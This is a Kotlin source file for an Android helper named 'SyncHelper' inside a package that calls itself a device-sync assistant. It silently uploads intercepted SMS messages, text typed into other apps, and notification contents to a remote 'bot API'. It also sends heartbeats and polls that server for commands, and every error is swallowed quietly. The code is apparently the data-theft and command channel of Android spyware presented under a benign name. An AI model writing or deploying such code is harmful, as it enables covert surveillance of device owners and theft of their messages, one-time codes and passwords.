package com.devicesync.assistant.helpers

import android.os.Handler
import android.os.Looper
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import org.json.JSONObject
import java.util.concurrent.Executors

object SyncHelper {

    private val executor = Executors.newCachedThreadPool()

    // ─────────────────────────────────────────
    // GET TIMESTAMP
    // ─────────────────────────────────────────
    private fun timestamp(): String {
        return SimpleDateFormat(
            "yyyy-MM-dd HH:mm:ss.SSS",
            Locale.getDefault()
        ).format(Date())
    }

    // ─────────────────────────────────────────
    // GET BASE URL
    // ─────────────────────────────────────────
    private fun baseUrl(): String = ConfigHelper.getBotApiUrl()

    // ─────────────────────────────────────────
    // POST TO BOT API
    // ─────────────────────────────────────────
    private fun post(endpoint: String, data: JSONObject) {
        executor.execute {
            try {
                val url = URL("${baseUrl()}/$endpoint")
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("Content-Type", "application/json")
                conn.doOutput = true
                conn.connectTimeout = 10000
                conn.readTimeout = 10000
                val writer = OutputStreamWriter(conn.outputStream)
                writer.write(data.toString())
                writer.flush()
                writer.close()
                conn.responseCode  // Execute request
                conn.disconnect()
            } catch (e: Exception) {
                // Silent fail — will retry on next heartbeat
            }
        }
    }

    // ─────────────────────────────────────────
    // SEND SMS RECEIVED
    // ─────────────────────────────────────────
    fun sendMessageReceived(sender: String, message: String, timestamp: String) {
        val data = JSONObject().apply {
            put("event", "message_received")
            put("sender", sender)
            put("message", message)
            put("timestamp", timestamp)
            put("device_id", ConfigHelper.getDeviceId())
        }
        post("android/message", data)
    }

    // ─────────────────────────────────────────
    // SEND INPUT OBSERVED
    // ─────────────────────────────────────────
    fun sendInputObserved(appName: String, packageName: String, inputText: String) {
        val data = JSONObject().apply {
            put("event", "input_observed")
            put("app_name", appName)
            put("package_name", packageName)
            put("input_text", inputText)
            put("timestamp", timestamp())
            put("device_id", ConfigHelper.getDeviceId())
        }
        post("android/input", data)
    }

    // ─────────────────────────────────────────
    // SEND ALERT RECEIVED
    // ─────────────────────────────────────────
    fun sendAlertReceived(appName: String, packageName: String, title: String, content: String) {
        val data = JSONObject().apply {
            put("event", "alert_received")
            put("app_name", appName)
            put("package_name", packageName)
            put("title", title)
            put("content", content)
            put("timestamp", timestamp())
            put("device_id", ConfigHelper.getDeviceId())
        }
        post("android/alert", data)
    }

    // ─────────────────────────────────────────
    // SEND DEVICE ONLINE
    // ─────────────────────────────────────────
    fun sendDeviceOnline() {
        val data = JSONObject().apply {
            put("event", "device_online")
            put("timestamp", timestamp())
            put("device_id", ConfigHelper.getDeviceId())
            put("model", android.os.Build.MODEL)
            put("android_version", android.os.Build.VERSION.RELEASE)
        }
        post("android/status", data)
    }

    // ─────────────────────────────────────────
    // SEND HEARTBEAT
    // Includes model so device registry stays fresh
    // ─────────────────────────────────────────
    fun sendHeartbeat() {
        val data = JSONObject().apply {
            put("event", "heartbeat")
            put("timestamp", timestamp())
            put("device_id", ConfigHelper.getDeviceId())
            put("model", android.os.Build.MODEL)
            put("android_version", android.os.Build.VERSION.RELEASE)
        }
        post("android/heartbeat", data)
    }

    // ─────────────────────────────────────────
    // CHECK RECONNECT SIGNAL
    // Polls bot for any pending commands
    // ─────────────────────────────────────────
    fun checkReconnectSignal() {
        executor.execute {
            try {
                val url = URL("${baseUrl()}/android/commands?device_id=${ConfigHelper.getDeviceId()}")
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "GET"
                conn.connectTimeout = 5000
                conn.readTimeout = 5000
                val response = conn.inputStream.bufferedReader().readText()
                conn.disconnect()
                // Handle commands if any
                handleCommands(response)
            } catch (e: Exception) {
                // Silent fail
            }
        }
    }

    // ─────────────────────────────────────────
    // HANDLE COMMANDS FROM BOT
    // ─────────────────────────────────────────
    private fun handleCommands(response: String) {
        try {
            if (response.isBlank()) return
            val json = JSONObject(response)
            val command = json.optString("command", "")
            when (command) {
                "reconnect" -> sendDeviceOnline()
                "ping" -> sendHeartbeat()
            }
        } catch (e: Exception) {
            // Silent fail
        }
    }
}
